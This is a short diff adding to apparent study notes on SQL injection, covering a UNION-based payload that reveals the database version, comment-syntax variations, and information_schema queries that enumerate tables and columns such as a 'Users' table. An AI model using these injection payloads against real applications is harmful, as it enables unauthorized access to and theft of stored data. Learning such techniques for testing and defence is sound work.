@@ -113,6 +113,25 @@ The table and column names it contains.
 
 ```sql
 Sample code:
+First find number of columns, then find data type then find this
 
 'UNION SELECT @@version --
+
+If -- this comment won't work, then go for #(different db different comments)
+```
+
+### Listing content of db:
+
+Most dbs except Oracle have views to display the information.
+
+```sql
+SELECT table_name FROM information_schema.tables
+
+--For displaying about tables info
+
+SELECT column_name FROM information_schema.columns WHERE table_name = 'Users'
+--For column names of specific table
+
+Then select 
+select coulmnname from tablename
 ```
